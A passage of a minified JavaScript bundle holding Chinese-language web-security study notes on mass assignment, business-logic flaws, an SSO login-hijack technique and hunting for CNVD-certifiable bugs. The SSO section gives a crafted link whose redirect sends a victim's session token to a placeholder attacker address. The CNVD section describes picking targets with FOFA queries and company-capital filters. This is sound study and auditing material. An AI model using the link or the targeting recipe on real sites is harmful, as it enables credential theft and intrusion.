    \u6700\u540E\u5BF9\u6587\u4EF6\u603B\u4E2A\u6570\u4E5F\u5E94\u8BE5\u6709\u6240\u9650\u5236\uFF0C\u907F\u514D\u8FC7\u591A\u7684\u6587\u4EF6\u6570\u76EE\u5BFC\u81F4\u5360\u7528\u7CFB\u7EDF\u8D44\u6E90\u3002

  `),Object(u.c)("\u81EA\u52A8\u7ED1\u5B9A\u6F0F\u6D1E",`

\u53C2\u8003\u8D44\u6599\uFF1A
    https://github.com/Cryin/Paper/blob/master/Spring%20MVC%20Autobinding%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E5%88%9D%E7%AA%A5.md

Autobinding-\u81EA\u52A8\u7ED1\u5B9A\u6F0F\u6D1E\uFF0C\u6839\u636E\u4E0D\u540C\u8BED\u8A00/\u6846\u67B6\uFF0C\u8BE5\u6F0F\u6D1E\u6709\u51E0\u4E2A\u4E0D\u540C\u7684\u53EB\u6CD5\uFF0C\u5982\u4E0B\uFF1A

    Mass Assignment: Ruby on Rails, NodeJS
    Autobinding: Spring MVC, ASP.NET MVC
    Object injection: PHP(\u5BF9\u8C61\u6CE8\u5165\u3001\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E)

\u6F0F\u6D1E\u6210\u56E0
    \u653B\u51FB\u8005\u53EF\u80FD\u5C06\u975E\u9884\u671F\u7684HTTP\u8BF7\u6C42\u53C2\u6570\u7ED1\u5B9A\u5230\u4E00\u4E2A\u5BF9\u8C61\u4E0A\uFF0C\u4F7F\u7528\u8FD9\u79CD\u65B9\u6CD5\u6765\u521B\u5EFA\u3001\u4FEE\u6539\u3001\u66F4\u65B0\u5F00\u53D1\u4EBA\u5458\u6216\u8005\u4E1A\u52A1\u672C\u8EAB\u4ECE\u672A\u6253\u7B97\u53D8\u66F4\u7684\u53C2\u6570\uFF0C\u800C\u8FD9\u4E9B\u65B0\u53C2\u6570\u53CD\u8FC7\u6765\u53C8\u4F1A\u5F71\u54CD\u7A0B\u5E8F\u4EE3\u7801\u4E2D\u4E0D\u9700\u8981\u7684\u65B0\u53D8\u91CF\u6216\u5BF9\u8C61\uFF0C\u8FDB\u800C\u89E6\u53D1\u4E00\u4E9B\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u91CD\u70B9\u5BA1\u8BA1\u5E94\u7528\u7A0B\u5E8F\u63A5\u53C2\u65F6\u662F\u5426\u4F7F\u7528\u81EA\u52A8\u7ED1\u5B9A\u6CE8\u5165\u5B8C\u6574\u5BF9\u8C61\uFF0C\u800C\u5BF9\u8C61\u662F\u5426\u53C8\u5BF9\u5E94\u4E86\u6570\u636E\u5C42\u7684\u5B9E\u4F53\u7C7B\uFF0C\u5728\u66F4\u65B0\u6570\u636E\u65F6\u662F\u5426\u80FD\u591F\u901A\u8FC7\u6DFB\u52A0\u53C2\u6570\u7684\u65B9\u5F0F\u66F4\u65B0\u975E\u9884\u671F\u7684\u5C5E\u6027\u503C\uFF1B\u6216\u8FD9\u4E9B\u53C2\u6570\u80FD\u5426\u5F71\u54CD\u540E\u7EED\u4E1A\u52A1\u903B\u8F91\u3002

\u5982\u4F55\u4FEE\u590D
    \u53D6\u539F\u59CB\u6570\u636E\u7531DAO\u5C42\u53D6\uFF1B\u5B58\u653E\u4E8Esession\u4E2D\u7684\u5BF9\u8C61\uFF0C\u5982\u7528\u6237\u7B49\uFF0C\u5728\u66F4\u65B0\u4FE1\u606F\u65F6\u6CE8\u610F\u654F\u611F\u5B57\u6BB5\uFF1B\u4F7F\u7528\u81EA\u52A8\u7ED1\u5B9A\u4EE5\u5B9E\u4F53\u7C7B\u6765\u63A5\u53C2\u65F6\uFF0C\u786E\u4FDD\u7C7B\u5C5E\u6027\u4E0E\u5B9E\u9645\u53C2\u6570\u80FD\u591F\u4E00\u4E00\u5BF9\u5E94\u3002


  `),Object(u.c)("\u5176\u4ED6\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E________\u6821\u9A8C\u4E0D\u5B8C\u5168________\u6821\u9A8C\u987A\u5E8F\u9519\u8BEF________\u6821\u9A8C\u903B\u8F91\u8BBE\u8BA1\u9519\u8BEF________\u4EFB\u610F\u5BC6\u7801\u91CD\u7F6E________\u9A8C\u8BC1\u7801\u7ED5\u8FC7________\u767B\u5F55________\u767B\u9646________\u6CE8\u518C________\u627E\u56DE\u5BC6\u7801________\u91CD\u7F6E\u5BC6\u7801________\u624B\u673A\u9A8C\u8BC1________\u90AE\u7BB1\u9A8C\u8BC1________\u5145\u503C________\u4ED8\u6B3E________\u654F\u611F\u4FE1\u606F\u67E5\u8BE2________\u8EAB\u4EFD\u4FE1\u606F\u8BA4\u8BC1\u903B\u8F91\u95EE\u9898________\u77ED\u4FE1\u8F70\u70B8________\u90AE\u4EF6\u8F70\u70B8________\u7535\u8BDD\u8F70\u70B8________\u5F31\u52A0\u5BC6________\u5F31\u53E3\u4EE4________\u5F31\u5BC6\u7801________\u5F31\u5BC6\u94A5",`
\u6F0F\u6D1E\u6210\u56E0
    \u5728\u4EE3\u7801\u4E2D\u53EF\u80FD\u5B58\u5728\u5404\u79CD\u4E1A\u52A1\u903B\u8F91\u7C7B\u7684\u6F0F\u6D1E\uFF0C\u8981\u5177\u4F53\u770B\u5F00\u53D1\u4EBA\u5458\u5B9E\u73B0\u7684\u4EE3\u7801\u903B\u8F91\u3002\u5728\u5B9E\u73B0\u6709\u8BEF\u7684\u60C5\u51B5\u4E0B\uFF0C\u5982\u6821\u9A8C\u4E0D\u5B8C\u5168\u3001\u6821\u9A8C\u987A\u5E8F\u9519\u8BEF\u3001\u6821\u9A8C\u903B\u8F91\u8BBE\u8BA1\u9519\u8BEF\u7B49\uFF0C\u5C06\u4F1A\u4EA7\u751F\u5404\u79CD\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u4E00\u3001\u6700\u5E38\u89C1\u7684\u5C31\u662F  \u4EFB\u610F\u5BC6\u7801\u91CD\u7F6E\u3001\u9A8C\u8BC1\u7801\u7ED5\u8FC7  \u7B49\u7B49\u3002

    \u4E8C\u3001\u4E0B\u9762\u7B80\u5355\u5217\u4E3E\u4E86\u5176\u5B83\u7684\u53E6\u5916\u4E00\u4E9B\uFF1A


        1. \u7528\u6237\u767B\u9646\u3001\u7528\u6237\u6CE8\u518C\u3001\u627E\u56DE\u5BC6\u7801\u7B49\u529F\u80FD\u4E2D\u5BC6\u7801\u4FE1\u606F\u672A\u91C7\u7528\u52A0\u5BC6\u7B97\u6CD5\u3002

        2. \u7528\u6237\u767B\u9646\u3001\u7528\u6237\u6CE8\u518C\u3001\u627E\u56DE\u5BC6\u7801\u7B49\u529F\u80FD\u4E2D\`\u672A\u91C7\u7528\u9A8C\u8BC1\u7801\`\u6216\`\u9A8C\u8BC1\u7801\u672A\u505A\u5B89\u5168\u5237\u65B0\`(\u672A\u5237\u65B0Session\u4E2D\u9A8C\u8BC1\u7801\u7684\u503C)\u5BFC\u81F4\u7684\u649E\u5E93\u3001\u5BC6\u7801\u7206\u7834\u6F0F\u6D1E\u3002

        3. \u627E\u56DE\u5BC6\u7801\u903B\u8F91\u95EE\u9898(\u5982:\u53EF\u76F4\u63A5\u8DF3\u8FC7\u9A8C\u8BC1\u903B\u8F91\u76F4\u63A5\u53D1\u5305\u4FEE\u6539)\u3002

        4. \u624B\u673A\u3001\u90AE\u7BB1\u9A8C\u8BC1\u3001\u627E\u56DE\u5BC6\u7801\u7B49\u6D89\u53CA\u5230\u52A8\u6001\u9A8C\u8BC1\u7801\`\u672A\u9650\u5236\u9A8C\u8BC1\u7801\u5931\u8D25\u6B21\u6570\`\u3001\`\u9A8C\u8BC1\u7801\u6709\u6548\u671F\`\u3001\`\u9A8C\u8BC1\u7801\u957F\u5EA6\u8FC7\u77ED\`\u5BFC\u81F4\u7684\u9A8C\u8BC1\u7801\u7206\u7834\u95EE\u9898\u3002

        5. \u5145\u503C\u3001\u4ED8\u6B3E\u7B49\u529F\u80FD\u8C03\u7528\u4E86\u7B2C\u4E09\u65B9\u652F\u4ED8\u7CFB\u7EDF\u672A\u6B63\u786E\u6821\u9A8C\u63A5\u53E3(\u4E0E\u7B2C\u4E09\u65B9\u7684\u4EA4\u4E92\u3001\u4E0E\u5BA2\u6237\u7684\u4EA4\u4E92\uFF0C\u4E3B\u8981\u67E5\u770B\u903B\u8F91\u95EE\u9898)\u3002

        6. \u540E\u7AEF\u91C7\u7528\u4E86\`ORM\u6846\u67B6\`\u66F4\u65B0\u64CD\u4F5C\u65F6\u56E0\u5904\u7406\u4E0D\u5F53\u5BFC\u81F4\u53EF\u4EE5\u66F4\u65B0\u7528\u6237\u8868\u4EFB\u610F\u5B57\u6BB5(\u5982:\u7528\u6237\u6CE8\u518C\u3001\u7528\u6237\u4E2A\u4EBA\u8D44\u6599\u4FEE\u6539\u65F6\u53EF\u4EE5\`\u76F4\u63A5\u521B\u5EFA\u7BA1\u7406\u5458\u8D26\u53F7\`\u6216\u5176\u4ED6\u8D8A\u6743\u4FEE\u6539\u64CD\u4F5C)\u3002

        7. \u540E\u7AEF\u91C7\u7528\u4E86\`ORM\u6846\u67B6\`\u67E5\u8BE2\u6570\u636E\u65F6\u56E0\u5904\u7406\u4E0D\u5F53\u5BFC\u81F4\u53EF\u4EE5\u63A5\u6536\u4EFB\u4F55\u53C2\u6570\u5BFC\u81F4\u7684\u8D8A\u6743\u67E5\u8BE2\u3001\u654F\u611F\u4FE1\u606F\u67E5\u8BE2\u7B49\u5B89\u5168\u95EE\u9898\u3002

        8. \u7528\u6237\u4E2D\u5FC3\u8F6C\u8D26\u3001\u4FEE\u6539\u4E2A\u4EBA\u8D44\u6599\u3001\u5BC6\u7801\u3001\u9000\u51FA\u767B\u9646\u7B49\u529F\u80FD\u672A\u91C7\u7528\u9A8C\u8BC1\u7801\u6216\`Token\u673A\u5236\`\u5BFC\u81F4\u5B58\u5728\`CSRF\u6F0F\u6D1E\`\u3002

        9. \u540E\u7AEF\u670D\u52A1\u8FC7\u4E8E\u4FE1\u4EFB\u524D\u7AEF\uFF0C\u91CD\u8981\u7684\u53C2\u6570\u548C\u4E1A\u52A1\u903B\u8F91\u53EA\u505A\u4E86\u524D\u7AEF\u9A8C\u8BC1(\u5982:\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u7684\u6587\u4EF6\u7C7B\u578B\u53EA\u5728JS\u4E2D\u9A8C\u8BC1\u3001\u540E\u7AEF\u4E0D\u4ECESession\u4E2D\u83B7\u53D6\u7528\u6237ID\u3001\u7528\u6237\u540D\u800C\u662F\u76F4\u63A5\u63A5\u6536\u5BA2\u6237\u7AEF\u8BF7\u6C42\u7684\u53C2\u6570\u5BFC\u81F4\u7684\`\u8D8A\u6743\u95EE\u9898\`)\u3002

        10. \u7528\u6237\u8EAB\u4EFD\u4FE1\u606F\u8BA4\u8BC1\u903B\u8F91\u95EE\u9898(\u5982:\u540E\u53F0\u7CFB\u7EDF\u81EA\u52A8\u767B\u9646\u65F6\u76F4\u63A5\u8BFB\u53D6Cookie\u4E2D\u7684\u7528\u6237\u540D\u3001\u7528\u6237\u6743\u9650\u4E0D\u505A\u9A8C\u8BC1)\u3002

        11. \u91CD\u8981\u63A5\u53E3\u91C7\u7528\`ID\u81EA\u589E\u3001ID\u53EF\u9884\u6D4B\u5E76\u4E14\u4E91\u7AEF\u672A\u9A8C\u8BC1\u53C2\u6570\u6709\u6548\u6027\`\u5BFC\u81F4\u7684\u8D8A\u6743\u8BBF\u95EE\u3001\u4FE1\u606F\u6CC4\u6F0F\u95EE\u9898(\u5982:\u4EFB\u610F\u7528\u6237\u8BA2\u5355\u8D8A\u6743\u8BBF\u95EE)\u3002

        12. \u6761\u4EF6\u7ADE\u4E89\u6F0F\u6D1E_\u7ADE\u6001\u6F0F\u6D1E_\u6761\u4EF6\u7ADE\u4E89\u95EE\u9898____\u76F8\u5173`.concat(i.v.padding_\u591A\u884C\u6587\u672C_\u589E\u52A0\u5F00\u5934\u7A7A\u683C(bu,"              "),`

        13. \u91CD\u8981\u63A5\u53E3\`\u672A\u9650\u5236\u8BF7\u6C42\u9891\u7387\`\uFF0C\u5BFC\u81F4\u77ED\u4FE1\u3001\u90AE\u4EF6\u3001\u7535\u8BDD\u3001\u79C1\u4FE1\u7B49\u4FE1\u606F\u8F70\u70B8\u3002

        14. \u654F\u611F\u4FE1\u606F\u672A\u4FDD\u62A4\uFF0C\u5982\`Cookie\u4E2D\u76F4\u63A5\u5B58\u50A8\u7528\u6237\u5BC6\u7801\u7B49\u91CD\u8981\u4FE1\u606F\`\uFF0C\u8DDF\u8E2Acookie\u4E2D\u7684\u53D8\u91CF\u6700\u7EC8\u5230\u4E86\u54EA\u3002

        15. \u5F31\u52A0\u5BC6\u7B97\u6CD5\u3001\u5F31\u5BC6\u94A5\uFF0C\u5982\u52FF\u628ABase64\u5F53\u6210\u6570\u636E\u52A0\u5BC6\u65B9\u5F0F\u3001\u91CD\u8981\u7B97\u6CD5\u5BC6\u94A5\u91C7\u7528\u5F31\u53E3\u4EE4\u5982\`123456\`\u3002

        16. \u540E\u7AEF\u65E0\u5F02\u5E38\u5904\u7406\u673A\u5236\u3001\u672A\u81EA\u5B9A\u4E4950X\u9519\u8BEF\u9875\u9762,\u670D\u52A1\u5668\u5F02\u5E38\u5BFC\u81F4\u654F\u611F\u4FE1\u606F\u6CC4\u6F0F(\u5982:\u6570\u636E\u5E93\u4FE1\u606F\u3001\u7F51\u7AD9\u7EDD\u5BF9\u8DEF\u5F84\u7B49)\u3002

        17. \u4F7F\u7528\`DWR\u6846\u67B6\`\u5F00\u53D1\u65F6\u524D\u540E\u7AEF\u4E0D\u5206\u6F0F\u6D1E(\u5982:DWR\u76F4\u63A5\u8C03\u7528\u6570\u636E\u5E93\u4FE1\u606F\u628A\u7528\u6237\u767B\u9646\u903B\u8F91\u76F4\u63A5\u653E\u5230\u4E86\u524D\u7AEF\u6765\u505A)\u3002

\u5982\u4F55\u4FEE\u590D
    \u5728\u4E1A\u52A1\u903B\u8F91\u5B9E\u73B0\u65F6\u8BE6\u7EC6\u8BBE\u8BA1\uFF0C\u4EE3\u7801\u5B9E\u73B0\u65F6\u6CE8\u610F\u4E00\u4E9B\u5E38\u89C1\u7684\u5751\uFF0C\u907F\u514D\u51FA\u73B0\u4EE5\u4E0A\u63D0\u5230\u7684\u6F0F\u6D1E\u3002

  `)))]),\u6F0F\u6D1E\u7BC7____\u5355\u70B9\u767B\u5F55:G([Object(u.a)(m||(m=Object(t.a)([`
  \u3010\u5355\u70B9\u767B\u5F55\u3011\u3010SSO\u3011\u3010\u5355\u5E73\u53F0\u767B\u5F55\u3011

  \u53C2\u8003\u8D44\u6599\uFF1A
      https://www.cxyzjd.com/article/u012206617/109107745

  \u4ECB\u7ECD\uFF1A
      1\u3001\u8BBE\u8BA1\u521D\u8877\uFF1Asso\u5355\u70B9\u767B\u9646\uFF0C\u7528\u6237\u4E00\u6B21\u767B\u9646\uFF0C\u6240\u6709\u7CFB\u7EDF\u90FD\u53EF\u8BBF\u95EE\u3002
              1\u3001sso\u8BBE\u8BA1\u76EE\u7684\u662F\u7B80\u5316\u767B\u9646\u65B9\u5F0F\uFF0C\u53EF\u80FD\u6709\u5F88\u591A\u7CFB\u7EDF\uFF0C\u4F46\u662F\u591A\u4E2A\u7CFB\u7EDF\u90FD\u662F\u4E00\u4E2A\u673A\u6784\u7684\uFF0C\u6BCF\u4E2A\u7CFB\u7EDF\u6BCF\u6B21\u90FD\u8981\u5206\u522B\u767B\u9646\u5C31\u5F88\u590D\u6742\u3002
              2\u3001\u4E3E\u4E2A\u4F8B\u5B50\uFF0COpenID\u662F\u4E00\u4E2A\u5F88\u6D41\u884C\u7684sso\u6846\u67B6\uFF0C
                      1\u3001\u7528\u6237\u63D0\u4EA4  \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014  OpenID  \u2014\u2014\u2014\u2014\u2014\u2014  OpenID Provider\uFF08\u63D0\u4F9B\u8005\uFF09
                      2\u3001\u7F51\u7AD9\u91CD\u5B9A\u5411\u5230openID provider\u8BA4\u8BC1\uFF0C\u767B\u9646\u6210\u529F\u540E\uFF0C\u518D\u91CD\u5B9A\u5411\u56DE\u7F51\u7AD9\u3002

              3\u3001\u8FD9\u91CC\u53EF\u4EE5\u7406\u89E3\u4E3A\uFF1A\u95E8\u536B\u4E0D\u77E5\u9053\u4F60\u662F\u8C01\uFF0C\u7136\u540E\u8BA9\u4F60\u53BB\u67D0\u67D0\u5904\u76D6\u7AE0\uFF0C\u4F60\u53BB\u76D6\u7AE0\u5B8C\u6210\u540E\u56DE\u5230\u95E8\u536B\u5904\uFF0C\u95E8\u5916\u9A8C\u8BC1\u7EA2\u7AE0\u6CA1\u95EE\u9898\u5C31\u8BA9\u4F60\u901A\u8FC7\u3002

  \u5229\u7528\u65B9\u5F0F\uFF1A
      1\u3001\u7531\u4E8E\u5BA2\u6237\u53EF\u4EE5\u4F2A\u9020 OpenID Provider\uFF08\u63D0\u4F9B\u8005\uFF09\uFF0C\u6B64\u5904\u4EA7\u751F\u4E86sso\u767B\u9646\u52AB\u6301\u6F0F\u6D1E\u3002
              1\u3001\u653B\u51FB\u8005\u53EF\u4EE5\u5C06 \u91CD\u5B9A\u5411\u5730\u5740backurl \u4FEE\u6539\u4E3A\u81EA\u5DF1\u7684\u5730\u5740\uFF0C
              2\u3001\u7136\u540E\u7ED9 \u300A\u53D7\u5BB3\u8005\u300B \u53D1\u9001\u6076\u610F\u8FDE\u63A5
                      \u300Ahttp://abc.com/public/pages/login/index.html?backurl=http%3A%2F%2F\u6076\u610F\u5730\u5740%2FAccount%2FLogin%3FReturnUrl%3D%252f&app=YuLinTu\u300B
              3\u3001\u4E00\u65E6\u53D7\u5BB3\u8005\u70B9\u51FB\u94FE\u63A5\uFF0C\u5E76\u8F93\u5165\u6B63\u786E\u7684\u7528\u6237\u540D\u548C\u5BC6\u7801\u3002\u300A\u653B\u51FB\u8005\u670D\u52A1\u5668\u7684\u6076\u610F\u5730\u5740\u300B\u4F1A\u6536\u5230\u5982\u4E0B\u7684get\u8BF7\u6C42\uFF1A
                      1\u3001\u201CGET /Account/Login?ReturnUrl=%2f&sid=96c2182d0da29dc720fab468734fef9e47ced2993df16fda6b03c98e92f6e77475b4cf56623430d6 \u201D
                      2\u3001\u4ECE\u8FD9\u4E2A\u8BF7\u6C42\u4E2D\uFF0C\u653B\u51FB\u8005  \u5C31\u62FF\u5230\u4E86\u300ASSO\u5355\u70B9\u767B\u5F55\u300B \u7684\u5BC6\u94A5\u51ED\u8BC1\u3002
              4\u3001\u4E4B\u540E\uFF0C\u653B\u51FB\u8005\u5C31\u53EF\u4EE5\u4F7F\u7528 \u300A\u62FF\u5230\u7684Token\u300B\uFF0C\u4EE5\u53D7\u5BB3\u8005\u7684\u8EAB\u4EFD\u8FDB\u884C\u767B\u9646 abc.com \u7F51\u7AD9\u3002

  `])))]),\u6F0F\u6D1E\u7BC7____CNVD\u8BC1\u4E66:G([Object(u.a)(c||(c=Object(t.a)([`
  \u3010CNVD\u3011\u3001\u3010CNVD\u6F0F\u6D1E\u3011\u3001\u3010CNVD\u8BC1\u4E66\u3011

  \u8D44\u6599\uFF1A
          \u601D\u8DEF\u7BC7\uFF1A
                  https://www.freebuf.com/articles/web/280616.html
                  https://mp.weixin.qq.com/s?__biz=MzIyMDAwMjkzNg==&mid=2247498163&idx=1&sn=db4771a2609e7e34a51cb0d2eb8725d7
                  https://www.cnblogs.com/sfsec/p/16519788.html
          \u5BA1\u6279\u6D41\u7A0B\u7BC7\uFF1A
                  https://cn-sec.com/archives/861526.html
          \u4E00\u4E9B\u96F6\u788E\u7684\u6F0F\u6D1E\u7BC7\uFF1A
                  https://www.moonsec.com/3839.html
                  https://xie.infoq.cn/article/5b527d0e879e41119af3d3494
                  https://zone.huoxian.cn/d/901-cnvd/2
                  \u6BD4\u8F83\u7B80\u5355\u7684\u4E00\u4F8B\uFF1A
                          http://www.smatrix.org/forum/forum.php?mod=viewthread&tid=3493&extra=
                          \u4E00\u4E2A\u5947\u8469\u7684\u76EE\u6807\u8D44\u4EA7\uFF08\u90FD\u662F\u8FD9\u4E2A\u6C34\u5E73\u4E48\uFF1F\uFF09\uFF1Ahttps://www.secpulse.com/archives/160535.html

  `,`

  `,`

  `,`


  `,`


  `,`


  `,`



  `])),Object(u.c)("CNVD\u57FA\u672C\u6316\u6D1E\u601D\u8DEF",`

  CNVD\u57FA\u672C\u6316\u6D1E\u601D\u8DEF
          1\u3001\u5148\u4E86\u89E3\uFF0C\u57FA\u672C\u7533\u8BF7\u9700\u6C42\uFF1A
                  1\u3001\u901A\u7528\u578B\u6F0F\u6D1E\uFF0C\u7684\u7533\u8BF7\u9700\u6C42\uFF1A
                          1\u3001\u4E2D\u5371\u53CA\u4E2D\u5371\u4EE5\u4E0A\u7684\u901A\u7528\u6027\u6F0F\u6D1E
                                  1\u3001CNVD\u5DF2\u7ECF\u4E0D\u6536\u5F55 Web\u5E94\u7528 \u7684\u5F31\u53E3\u4EE4\u7684\u901A\u7528\u6D1E\u4E86\uFF0C\u4F46\u662F\u4E00\u4E9B\u8BBE\u5907\uFF08\u7F51\u7EDC\u8BBE\u5907\u3001\u5B89\u5168\u8BBE\u5907\uFF09\u7684\u5F31\u53E3\u4EE4\u6F0F\u6D1E\u5176\u8FD8\u662F\u6B63\u5E38\u6536\u5F55\u7684\u3002
                                          1\u3001\u5404\u5927\u5382\u5546\u7684\u7F51\u7EDC\u8BBE\u5907\u3001\u5B89\u5168\u8BBE\u5907\u90FD\u8BBE\u7F6E\u4E86\u9ED8\u8BA4\u8D26\u53F7\u5BC6\u7801\uFF0C\u57FA\u672C\u90FD\u4E3A\u5F31\u53E3\u4EE4\uFF0C
                                          2\u3001\u5EFA\u8BAE\u53EF\u4EE5\u5148\u4ECE \u7F51\u7EDC\u8BBE\u5907 \u7684\u5F31\u53E3\u4EE4\u5F00\u59CB\u641C\u7D22\uFF0C\u56E0\u4E3A \u5B89\u5168\u8BBE\u5907 \u57FA\u672C\u90FD\u4F1A\u8BBE\u7F6E \u9996\u6B21\u767B\u9646\u5F3A\u5236\u66F4\u6539\u5BC6\u7801\u3002
                          2\u3001\u6CE8\u518C\u8D44\u91D1\u5927\u4E8E 5000\u4E07\u4EBA\u6C11\u5E01\u6216\u6D89\u53CA\u515A\u653F\u673A\u5173\u3001\u91CD\u8981\u884C\u4E1A\u5355\u4F4D\u3001\u79D1\u7814\u9662\u6240\u3001\u91CD\u8981\u4F01\u4E8B\u4E1A\u5355\u4F4D
                          3\u3001\u6848\u4F8B\u6570\u91CF\u8D85\u8FC7 10 \u4E2A
                  2\u3001\u4E8B\u4EF6\u578B\u6F0F\u6D1E\uFF0C\u7684\u7533\u8BF7\u9700\u6C42\uFF1A
                          1\u3001\u4E8B\u4EF6\u578B\u6F0F\u6D1E\u5FC5\u987B\u662F\u4E09\u5927\u8FD0\u8425\u5546\uFF08\u79FB\u52A8\u3001\u8054\u901A\u3001\u7535\u4FE1\uFF09\u7684\u4E2D\u9AD8\u5371\u6F0F\u6D1E\uFF0C
                          2\u3001\u6216\u8005\u515A\u653F\u673A\u5173\u3001\u91CD\u8981\u884C\u4E1A\u5355\u4F4D\u3001\u79D1\u7814\u9662\u6240\u3001\u91CD\u8981\u4F01\u4E8B\u4E1A\u5355\u4F4D\uFF0C\u7684\u9AD8\u5371\u4E8B\u4EF6\u578B\u6F0F\u6D1E\uFF0C\u624D\u4F1A\u9881\u53D1\u539F\u521B\u6F0F\u6D1E\u8BC1\u4E66\uFF1A
                                  1\u3001\uFF08\u5982\uFF1A\u4E2D\u592E\u56FD\u6709\u5927\u578B\u4F01\u4E1A\u3001\u90E8\u59D4\u76F4\u5C5E\u4E8B\u4E1A\u5355\u4F4D\u7B49\uFF09

          2\u3001\u300A\u7B26\u5408\u8981\u6C42\u7684\u76EE\u6807\u300B\u5BFB\u627E\u65B9\u5F0F\uFF1A
                  1\u3001\u7B2C\u4E00\u79CD\uFF0C\u7CBE\u51C6\u6253\u51FB\uFF1A
                          \uFF08\u4EE5CNVD\u4E3A\u4E3B\uFF0CFOFA\u4E3A\u8F85\uFF09
                          1\u3001\u7ECF\u5E38\u53BB CNVD\u91CC\u53BB\u901B\uFF0C\u5C24\u5176\u8981\u6CE8\u610F\u7684\u662F\u8FD1\u671F\u516C\u5F00\u7684\u6F0F\u6D1E\uFF0C\u53EF\u4EE5\u4ECE\u4E2D\u9501\u5B9A\u8D44\u4EA7\u5927\u4E8E\u4E94\u5343\u4E07\u7684\u5382\u5546\uFF0C\u7136\u540E\u518D\u8FDB\u4E00\u6B65\u5229\u7528\u3002
                                  1\u3001\u6F0F\u6D1E\u6807\u9898\u4E2D\u6307\u51FA\u6F0F\u6D1E\u7C7B\u578B\uFF0C\u5982\u4E0A\u8FF0\u4E00\u5361\u901A\u7EFC\u5408\u7BA1\u7406\u7CFB\u7EDF\u5B58\u5728SQL\u6CE8\u5165\uFF0C\u53EF\u4EE5\u518D\u8FDB\u4E00\u6B65\u641C\u7D22\u8FD9\u4E2A\u516C\u53F8\u4E43\u81F3\u8FD9\u4E2A\u7CFB\u7EDF\u5386\u53F2\u6F0F\u6D1E\u3002
                          2\u3001\u5F53\u627E\u5230\u4E4B\u540E\uFF1A
                                  1\u3001\u901A\u8FC7\u76EE\u6807\u5355\u4F4D\u53BB\u67E5\u770B\u4ED6\u7684\u5B98\u7F51\uFF0C\u6536\u96C6\u76EE\u6807\u5355\u4F4D\u6240\u5F00\u53D1\u7684\u7CFB\u7EDF\u3001\u8F6F\u4EF6\uFF0C\u4EE5\u53CA\u670D\u52A1\u5BF9\u8C61
                                  2\u3001\u901A\u8FC7FOFA\u641C\u7D22\u5F15\u64CE\u53BB\u641C\u7D22\u7C7B\u4F3C\u8BED\u53E5
                                          body="xxxx\u516C\u53F8"
                                          body="\u6280\u672F\u652F\u6301 xxxx\u516C\u53F8"
                                          title="xxxx\u516C\u53F8"
                                  3\u3001\u627E\u5230\u4E86\u76EE\u6807\u5355\u4F4D\u6240\u5F00\u53D1\u7684\u7CFB\u7EDF\uFF0C\u6211\u4EEC\u53EF\u4EE5\u6839\u636E\u8BE5\u7CFB\u7EDF\u7684\u6307\u7EB9\u8FDB\u884C\u7CBE\u51C6\u641C\u7D22\uFF0C\u7136\u540E\u518D\u8FDB\u884C\u6F0F\u6D1E\u6316\u6398\u3002
                          3\u3001\u5728\u6F0F\u6D1E\u6316\u6398\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u6211\u4EEC\u8981\u5C24\u4E3A\u5173\u6CE8\u7684\u662F\u76EE\u6807\u5355\u4F4D\u7684\u5386\u53F2\u6F0F\u6D1E\uFF0C\u5982\u4E0A\u8FF0\u6848\u4F8B\uFF1ASQL\u6CE8\u5165\u3002
                  2\u3001\u6279\u91CF\u6316\u6398
                        1\u3001\u901A\u8FC7FOFA\u53BB\u641C\u7D22\u5982\u4E0B\u5173\u952E\u5B57\uFF08\u6BD4\u8F83\u5BBD\u6CDB\u7684\uFF09\uFF1A
                                title="\u7CFB\u7EDF"
                                title="\u95E8\u7981"
                                title="\u8BBE\u5907"
                                body="\u6280\u672F\u652F\u6301"
                                body="\u6280\u672F\u652F\u6301" && title="\u7CFB\u7EDF"
                        2\u3001\u914D\u5408\u7231\u4F01\u67E5\u53BB\u7B5B\u9009\u6CE8\u518C\u8D44\u91D1\u5927\u4E8E 5000\u4E07 \u7684\u76EE\u6807
                                1\u3001\u53EF\u4EE5\u76F4\u63A5\u901A\u8FC7\u7231\u4F01\u67E5\u3001\u4F01\u67E5\u67E5\u7B49\u7F51\u7AD9\u67E5\u8BE2
                                        1\u3001\u9009\u62E9\u9AD8\u7EA7\u641C\u7D22
                                        2\u3001\u52FE\u9009\u6CE8\u518C\u8D44\u91D15000w\u4EE5\u5916\uFF0C\u518D\u52FE\u9009\u6709\u8F6F\u4EF6\u8457\u4F5C\u6743\u3001\u6709\u7F51\u5740\u4FE1\u606F\uFF0C
                                                1\u3001\u60F3\u8981\u7CBE\u786E\u4E00\u70B9\u7684\u4E5F\u53EF\u4EE5\u628A\u884C\u4E1A\u9009\u4E00\u4E0B\uFF0C\u7531\u4E8E\u4E00\u6B21\u53EA\u80FD\u5BFC\u51FA1\u4E07\u6761\uFF0C\u53EF\u4EE5\u901A\u8FC7\u5730\u533A\u6216\u65F6\u95F4\u5212\u5206\u6765\u5206\u6B65\u5BFC\u51FA\u6240\u6709\u8D44\u4EA7\u4FE1\u606F
                                        3\u3001\u8F6F\u4EF6\u8457\u4F5C\u6743\u4FE1\u606F\uFF0C\u53EF\u4EE5\u67E5\u770B\u5230\u66F4\u591A\u7684\uFF1A
                                                1\u3001\u53EF\u4EE5\u5BFB\u627E\u4E00\u4E9B\u8BE5\u516C\u53F8\u5F00\u53D1\u7684\u5176\u4ED6\u516C\u53F8\u7CFB\u7EDF\u4FE1\u606F
                                                      1\u3001\u5728\u53D1\u73B0\u5B58\u5728\u67D0\u4E2A\u6F0F\u6D1E\u540E\uFF0C\u6211\u4EEC\u8FD8\u53EF\u4EE5\u53BB\u5BFB\u627E\u8BE5\u516C\u53F8\u7684\u5176\u4ED6\u7CFB\u7EDF\uFF0C\u770B\u770B\u8BE5\u516C\u53F8\u5176\u4ED6\u7CFB\u7EDF\u662F\u5426\u4E5F\u5B58\u5728\u8BE5\u79CD\u7C7B\u578B\u7684\u6F0F\u6D1E
